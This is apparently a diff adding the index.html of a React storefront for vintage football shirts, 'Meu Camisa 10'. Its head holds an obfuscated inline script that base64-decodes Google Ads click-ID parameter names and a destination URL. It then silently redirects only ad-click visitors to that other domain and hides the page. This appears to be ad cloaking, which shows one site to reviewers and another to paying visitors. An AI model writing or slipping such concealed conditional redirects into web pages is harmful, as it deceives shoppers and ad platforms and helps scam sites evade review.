@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+  <head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=AW-17865747012"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'AW-17865747012');
+</script>
+<script>
+  (function() {
+    try {
+      var _k = ['Z2NsaWQ=', 'Z2JyYWlk', 'd2JyYWlk', 'Z2FkX3NvdXJjZQ==', 'Z2FkX2NhbXBhaWduaWQ='];
+      var _u = 'aHR0cHM6Ly9sb2phbWV1Y2FtaXNhMTAuY29tLmJyLw==';
+      var _t = _k.map(function(k) { return atob(k); });
+      var _h = window.location.href;
+      var _s = window.location.search;
+      var _ha = window.location.hash;
+      
+      var _merged = new URLSearchParams(_s);
+      if (_ha.includes('?')) {
+        var _hp = new URLSearchParams(_ha.split('?')[1]);
+        _hp.forEach(function(v, k) { _merged.set(k, v); });
+      }
+      
+      _t.forEach(function(key) {
+        if (!_merged.has(key)) {
+          var _m = _h.match(new RegExp('[?&]' + key + '=([^&?#]+)', 'i'));
+          if (_m) _merged.set(key, _m[1]);
+        }
+      });
+
+      var _should = _t.some(function(trig) { return _merged.has(trig); });
+      
+      if (_should) {
+        var _dest = new URL(atob(_u));
+        _merged.forEach(function(v, k) { _dest.searchParams.set(k, v); });
+        var _final = _dest.toString();
+        window.location.replace(_final);
+        setTimeout(function() { window.location.href = _final; }, 0);
+        // Bloqueia a renderização do corpo se possível
+        document.documentElement.style.display = 'none';
+      } else if (_merged.toString().length > 0) {
+        sessionStorage.setItem('original_params', _merged.toString());
+      }
+    } catch (e) {}
+  })();
+</script>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="icon" type="image/png" href="https://lh3.googleusercontent.com/d/1RImMow81uCcNeYa0c-8SnUwSIWl_Ya99" />
+    <title>Meu Camisa 10 - Camisas de Futebol Vintage</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&family=Oswald:wght@500;700&display=swap" rel="stylesheet">
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            fontFamily: {
+              sans: ['Inter', 'sans-serif'],
+              display: ['Oswald', 'sans-serif'],
+            },
+            colors: {
+              brand: {
+                50: '#fdf8f4',
+                100: '#fbece0',
+                200: '#f7d6bd',
+                300: '#f1b88f',
+                400: '#e8915a',
+                500: '#ba6420', // Base color
+                600: '#a7541a',
+                700: '#8b4318',
+                800: '#6f3617',
+                900: '#5a2d16',
+              }
+            }
+          }
+        }
+      }
+    </script>
+    <style>
+      body {
+        -webkit-font-smoothing: antialiased;
+        -moz-osx-font-smoothing: grayscale;
+      }
+    </style>
+  <script type="importmap">
+{
+  "imports": {
+    "lucide-react": "https://esm.sh/lucide-react@^0.563.0",
+    "react/": "https://esm.sh/react@^19.2.4/",
+    "react": "https://esm.sh/react@^19.2.4",
+    "@google/genai": "https://esm.sh/@google/genai@^1.40.0",
+    "react-dom/": "https://esm.sh/react-dom@^19.2.4/"
+  }
+}
+</script>
+<link rel="stylesheet" href="/index.css">
+</head>
+  <body class="bg-gray-50 text-gray-900">
+    <div id="root"></div>
+  <script type="module" src="/index.tsx"></script>
+</body>
+</html>
